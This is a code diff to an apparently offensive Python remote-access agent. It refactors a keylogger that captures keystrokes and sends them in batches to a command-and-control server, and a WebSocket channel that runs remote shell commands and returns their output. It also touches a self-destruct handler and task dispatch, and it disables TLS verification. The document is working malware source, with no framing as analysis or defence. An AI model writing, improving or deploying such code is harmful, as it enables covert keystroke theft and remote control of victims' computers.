@@ -1036,11 +1036,13 @@ class SOCKS5Proxy:
 # ======================
 # Keylogger
 # ======================
+import threading
+
 class Keylogger:
     def __init__(self):
         self.log = ""
         self.listener = None
-        self.running = False
+        self.running = threading.Event()
         self.ws_client = None
         self.lock = threading.Lock()
         self.batch_size = 50
@@ -1055,12 +1057,12 @@ class Keylogger:
             self.logger.setLevel(logging.DEBUG)
 
     def start(self):
-        if self.running:
+        if self.running.is_set():
             self.logger.debug("Keylogger start called but already running")
             return {"status": "error", "message": "Keylogger already running"}
         
         self.logger.debug("Keylogger start called")
-        self.running = True
+        self.running.set()
         self.log = ""
         self._last_send_time = time.time()
         self.listener = keyboard.Listener(on_press=self._on_key_press)
@@ -1072,12 +1074,15 @@ class Keylogger:
     def _start_sending_thread(self):
         def send_loop():
             self.logger.debug("Keylogger sending thread started")
-            while self.running:
+            while self.running.is_set():
                 time.sleep(self.batch_interval)
                 self._send_logs()
         threading.Thread(target=send_loop, daemon=True).start()
 
     def _on_key_press(self, key):
+        if not self.running.is_set():
+            self.logger.debug("Keylogger received key press but not running, ignoring")
+            return
         self.logger.debug(f"Key pressed: {key}")
         try:
             char = str(key.char)
@@ -1094,7 +1099,7 @@ class Keylogger:
             self._send_logs()
 
     def _send_logs(self):
-        if not self.ws_client or not self.running:
+        if not self.ws_client or not self.running.is_set():
             self.logger.debug("Keylogger _send_logs: ws_client missing or not running")
             return
         with self.lock:
@@ -1120,13 +1125,20 @@ class Keylogger:
             self.logger.error(f"Failed to send keylogger data: {str(e)}")
 
     def stop(self):
-        if not self.running:
+        if not self.running.is_set():
             self.logger.debug("Keylogger stop called but not running")
             return {"status": "error", "message": "Keylogger not running"}
         
-        self.running = False
+        self.logger.debug("Keylogger stop called")
+        self.running.clear()
         if self.listener:
             self.listener.stop()
+            self.logger.debug("Keylogger listener stopped")
+            self.listener.join()
+            self.logger.debug("Keylogger listener thread joined")
+            self.listener = None
+        else:
+            self.logger.debug("Keylogger listener was None")
         self._send_logs()
         self.logger.debug("Keylogger stopped")
         return {"status": "success", "message": "Keylogger stopped"}
@@ -1184,10 +1196,11 @@ if platform.system() == 'Windows':
 # WebSocket Client
 # ======================
 class WebSocketClient:
-    def __init__(self, agent_id, crypto, server_url, config):
+    def __init__(self, agent_id, crypto, server_url, config, namespace):
         self.agent_id = agent_id
         self.crypto = crypto
         self.config = config
+        self.namespace = namespace
         self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/socket.io'
         self.socket = None
         self.connected = False
@@ -1205,42 +1218,43 @@ class WebSocketClient:
 
     def _setup_event_handlers(self):
         """Setup all WebSocket event handlers"""
-        @self.socket.on('execute_command', namespace='/terminal')
-        def on_command(data):
-            try:
-                self.logger.info(f"Executing command: {data.get('command')}")
-                
-                # Execute the command and get results
-                result = self._execute_command(data.get('command', ''))
-                
-                # Format the response properly
-                response = {
-                    'agent_id': self.agent_id,
-                    'command': data.get('command', ''),
-                    'output': result.get('output', ''),
-                    'error': result.get('error', ''),
-                    'current_dir': result.get('current_dir', '')
-                }
-                
-                self.logger.debug(f"Sending command result: {response}")
-                self.socket.emit('command_result', response, namespace='/terminal')
-                
-            except Exception as e:
-                self.logger.error(f"Command handling failed: {str(e)}")
-                self.socket.emit('command_result', {
-                    'agent_id': self.agent_id,
-                    'error': f"Command processing error: {str(e)}",
-                    'current_dir': self.current_dir
-                }, namespace='/terminal')
-        
-        @self.socket.on('force_kill', namespace='/terminal')
-        def on_force_kill(data):
-            self._log_info("[!] Received forced kill command")
-            self._immediate_self_destruct()
+        if self.namespace == '/terminal':
+            @self.socket.on('execute_command', namespace='/terminal')
+            def on_command(data):
+                try:
+                    self.logger.info(f"Executing command: {data.get('command')}")
+                    
+                    # Execute the command and get results
+                    result = self._execute_command(data.get('command', ''))
+                    
+                    # Format the response properly
+                    response = {
+                        'agent_id': self.agent_id,
+                        'command': data.get('command', ''),
+                        'output': result.get('output', ''),
+                        'error': result.get('error', ''),
+                        'current_dir': result.get('current_dir', '')
+                    }
+                    
+                    self.logger.debug(f"Sending command result: {response}")
+                    self.socket.emit('command_result', response, namespace='/terminal')
+                    
+                except Exception as e:
+                    self.logger.error(f"Command handling failed: {str(e)}")
+                    self.socket.emit('command_result', {
+                        'agent_id': self.agent_id,
+                        'error': f"Command processing error: {str(e)}",
+                        'current_dir': self.current_dir
+                    }, namespace='/terminal')
+            
+            @self.socket.on('force_kill', namespace='/terminal')
+            def on_force_kill(data):
+                self._log_info("[!] Received forced kill command")
+                self._immediate_self_destruct()
 
     def connect(self):
         try:
-            self.logger.info(f"Connecting to WebSocket at {self.server_url}")
+            self.logger.info(f"Connecting to WebSocket at {self.server_url} namespace {self.namespace}")
             
             self.socket = socketio.Client(
                 ssl_verify=False,
@@ -1255,9 +1269,9 @@ class WebSocketClient:
             connection_timeout = 10  # seconds
             connected_event = threading.Event()
 
-            @self.socket.on('connect', namespace='/terminal')
+            @self.socket.on('connect', namespace=self.namespace)
             def on_connect():
-                self.logger.info("WebSocket connected on /terminal, authenticating...")
+                self.logger.info(f"WebSocket connected on {self.namespace}, authenticating...")
                 try:
                     auth_data = {
                         'agent_id': self.agent_id,
@@ -1266,31 +1280,16 @@ class WebSocketClient:
                             'timestamp': int(time.time())
                         })
                     }
-                    self.socket.emit('agent_connect', auth_data, namespace='/terminal')
+                    self.socket.emit('agent_connect', auth_data, namespace=self.namespace)
                     self._setup_event_handlers()
                     self.connected = True
                     connected_event.set()
                 except Exception as e:
                     self.logger.error(f"Authentication failed: {str(e)}")
 
-            @self.socket.on('connect', namespace='/keylogger')
-            def on_keylogger_connect():
-                self.logger.info("WebSocket connected on /keylogger, authenticating...")
-                try:
-                    auth_data = {
-                        'agent_id': self.agent_id,
-                        'auth_token': self.crypto.encrypt({
-                            'agent_id': self.agent_id,
-                            'timestamp': int(time.time())
-                        })
-                    }
-                    self.socket.emit('agent_connect', auth_data, namespace='/keylogger')
-                except Exception as e:
-                    self.logger.error(f"Authentication failed on /keylogger: {str(e)}")
-
-            @self.socket.on('disconnect', namespace='/terminal')
+            @self.socket.on('disconnect', namespace=self.namespace)
             def on_disconnect():
-                self.logger.warning("WebSocket disconnected")
+                self.logger.warning(f"WebSocket disconnected from {self.namespace}")
                 self.connected = False
 
             # Connect with timeout
@@ -1301,7 +1300,7 @@ class WebSocketClient:
                     'X-Agent-ID': self.agent_id
                 },
                 transports=['websocket'],
-                namespaces=['/terminal', '/keylogger']
+                namespaces=[self.namespace]
             )
 
             if not connected_event.wait(connection_timeout):
@@ -1670,14 +1669,15 @@ class Agent:
     def _execute_task(self, task):
         try:
             task_id = task.get("task_id")
-            if task_id in self._executed_task_ids:
-                self._log_info(f"Skipping execution of duplicate task with ID: {task_id}")
-                return {
-                    "status": "error",
-                    "message": f"Task with ID {task_id} has already been executed"
-                }
+            task_id_str = str(task_id)
+            self._log_info(f"Checking task ID: {task_id_str} (type: {type(task_id)})")
+            self._log_info(f"Current executed task IDs: {self._executed_task_ids}")
+            if task_id_str in self._executed_task_ids:
+                self._log_info(f"Skipping execution of duplicate task with ID: {task_id_str}")
+                return None
             else:
-                self._executed_task_ids.add(task_id)
+                self._log_info(f"Executing new task with ID: {task_id_str}")
+                self._executed_task_ids.add(task_id_str)
 
             task_type = task.get("type")
             self._log_info(f"Received task: {json.dumps(task, indent=2)}")
@@ -1701,7 +1701,8 @@ class Agent:
                             self.agent_id,
                             self.crypto,
                             self.config.C2_SERVER,
-                            self.config
+                            self.config,
+                            '/terminal'
                         )
                     
                     if not self.ws_client.connected:
@@ -1932,32 +1933,38 @@ class Agent:
             if task_type == "keylogger":
                 action = task.get("action") or task.get("data", {}).get("action")
                 if action == "start":
-                    if not self.ws_client or not self.ws_client.connected:
-                        self.ws_client = WebSocketClient(
+                    if not hasattr(self, 'keylogger_ws_client') or not self.keylogger_ws_client or not self.keylogger_ws_client.connected:
+                        self.keylogger_ws_client = WebSocketClient(
                             self.agent_id,
                             self.crypto,
                             self.config.C2_SERVER,
-                            self.config
+                            self.config,
+                            '/keylogger'
                         )
-                    if self.ws_client.connect():
-                        self.keylogger.ws_client = self.ws_client
+                    if self.keylogger_ws_client.connect():
+                        self.keylogger.ws_client = self.keylogger_ws_client
                     else:
                         return {"status": "error", "message": "Failed to connect WebSocket for keylogger"}
                     return self.keylogger.start()
                 elif action == "stop":
+                    self._log_info("Stopping keylogger")
+                    # Send any remaining logs before stopping
+                    if self.keylogger.ws_client and self.keylogger.running:
+                        self.keylogger._send_logs()
                     result = self.keylogger.get_logs()
                     self.keylogger.stop()
-                    if self.ws_client and self.ws_client.connected:
-                        self.ws_client.disconnect()
+                    if hasattr(self, 'keylogger_ws_client') and self.keylogger_ws_client and self.keylogger_ws_client.connected:
+                        self._log_info("Disconnecting keylogger WebSocket client")
+                        self.keylogger_ws_client.disconnect()
                     self.keylogger.ws_client = None
-                    self.ws_client = None
+                    self.keylogger_ws_client = None
                     return {"logs": result}
-            
-            else:
-                return {
-                    "status": "error",
-                    "message": f"Unknown task type: {task_type}"
-                }
+                
+                else:
+                    return {
+                        "status": "error",
+                        "message": f"Unknown task type: {task_type}"
+                    }
         
         except Exception as e:
             self._log_error(f"Error executing task: {str(e)}")
